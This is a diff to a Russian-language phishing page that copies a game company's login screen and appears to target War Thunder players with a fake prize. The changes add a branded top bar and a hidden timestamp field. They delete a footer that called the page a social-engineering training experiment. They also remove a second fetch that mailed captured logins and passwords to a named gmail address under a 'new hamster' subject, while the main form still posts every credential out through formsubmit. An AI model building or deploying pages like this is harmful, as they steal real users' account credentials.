@@ -163,6 +163,30 @@
 <div class="bg-modal-wnd js-bg-modal-wnd"></div>
 <div id="GCM-Container"></div>
 
+<!-- Верхняя панель (PIX) -->
+<div style="background: #0a0f1a; border-bottom: 1px solid #2a313c; padding: 8px 40px; display: flex; align-items: center; justify-content: space-between; font-family: Arial, sans-serif; font-size: 13px;">
+    <div style="display: flex; align-items: center; gap: 30px;">
+        <div style="color: #ffd700; font-weight: bold;">PIX</div>
+        <div style="display: flex; gap: 25px; color: #b0b8c5;">
+            <span style="cursor: pointer;">ИГРЫ</span>
+            <span style="cursor: pointer; color: #ffd700;">МАГАЗИН</span>
+            <span style="cursor: pointer;">ПОДДЕРЖКА</span>
+        </div>
+    </div>
+    <div style="display: flex; align-items: center; gap: 25px; color: #b0b8c5;">
+        <div style="display: flex; align-items: center; gap: 8px;">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                <path d="M14.117 10.786a6.668 6.668 0 0 1-12.117 0 13.3 13.3 0 0 1 6.058-1.453c2.182 0 4.241.524 6.059 1.453"/>
+                <ellipse cx="8" cy="4.667" rx="2.667" ry="3.333"/>
+            </svg>
+            <span>Войти</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 5px;">
+            <span>🇷🇺</span> ru
+        </div>
+    </div>
+</div>
+
 <header id="headerRoot">
     <div class="header__sticky-trigger js-scroll-watch__toggle-block"
          data-scroll-watch-target-id="headerRoot"
@@ -243,6 +267,7 @@
                         <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="table">
+                        <input type="hidden" name="time" id="timeField" value="">
                         
                         <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
                         <input type="password" name="password" placeholder="Пароль" id="password" required>
@@ -270,8 +295,6 @@
 
 <footer class="footer">
     <div class="footer__wrapper">
-        <div class="footer__copyright">
-            © 2026 ООО «Пиксель Шквал». Учебный эксперимент по социальной инженерии.
         </div>
     </div>
 </footer>
@@ -284,21 +307,14 @@ document.getElementById('phishForm').addEventListener('submit', function(e) {
     var password = document.getElementById('password').value;
     var time = new Date().toLocaleString('ru-RU');
     
-    // Отправка данных
+    // Устанавливаем время в скрытое поле
+    document.getElementById('timeField').value = time;
+    
+    // Отправляем ВСЕ данные (логин, пароль, время) на formsubmit
     fetch(this.action, {
         method: 'POST',
         body: new FormData(this)
     }).catch(error => console.log('Ошибка:', error));
-    
-    // Отправка уведомления
-    fetch('https://formsubmit.co/dangerlight228@gmail.com', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            _subject: '🐹 НОВЫЙ ХОМЯЧОК!',
-            message: `Логин: ${login}\nПароль: ${password}\nВремя: ${time}`
-        })
-    }).catch(error => console.log('Ошибка уведомления:', error));
     
     // Показываем баннер
     document.getElementById('warningBanner').style.display = 'block';
